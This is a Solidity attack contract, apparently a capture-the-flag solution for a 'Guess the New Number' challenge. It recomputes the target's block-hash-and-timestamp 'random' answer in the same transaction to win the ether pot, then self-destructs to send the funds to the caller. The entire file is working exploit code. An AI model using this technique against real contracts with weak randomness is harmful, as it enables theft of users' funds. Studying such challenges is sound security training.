pragma solidity ^0.4.22;
import "./GuessTheNewNumberChallenge.sol";

contract Attack {
    //address public constant challengeAddr = 0x18D7636ca6E74Bc5e01248A72b1f6ccc7C511310;
    address public challengeAddr;

    function Attack(address _challengeAddr) public {
        challengeAddr = _challengeAddr;
    }

    function destroy() public {
        selfdestruct(msg.sender);
    }

    function attack() public payable {
        // simulate all steps the challenge contract does
        require(address(this).balance >= 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        GuessTheNewNumberChallenge challenge = GuessTheNewNumberChallenge(
            challengeAddr
        );
        challenge.guess.value(msg.value)(answer);
    }

    function() public payable {}
}